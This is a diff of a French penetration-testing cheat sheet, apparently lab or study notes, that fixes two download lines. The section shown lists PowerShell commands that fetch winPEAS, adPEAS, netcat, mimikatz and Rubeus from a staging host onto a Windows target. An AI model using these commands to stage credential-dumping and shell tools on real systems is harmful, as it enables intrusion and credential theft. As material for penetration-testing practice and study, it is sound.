@@ -210,8 +210,8 @@ https://github.com/swisskyrepo/PayloadsAllTheThings
 ### Téléchargements utiles
 
     iwr -Uri http://192.168.50.100/winpeas.exe -Outfile .\winpeas.exe
-    iwr -Uri http://192.168.50.100/winpeas.exe -Outfile .\adpeas.ps1
-    iwr -Uri http://192.168.50.100/winpeas.exe -Outfile .\adpeas-light.ps1
+    iwr -Uri http://192.168.50.100/adpeas.ps1 -Outfile .\adpeas.ps1
+    iwr -Uri http://192.168.50.100/adpeas-light.ps1 -Outfile .\adpeas-light.ps1
     iwr -Uri http://192.168.50.100/nc.exe -Outfile .\nc.exe
     iwr -Uri http://192.168.50.100/mimikatz.exe -Outfile .\mimikatz.exe
     iwr -Uri http://192.168.50.100/Rubeus.exe -Outfile .\Rubeus.exe
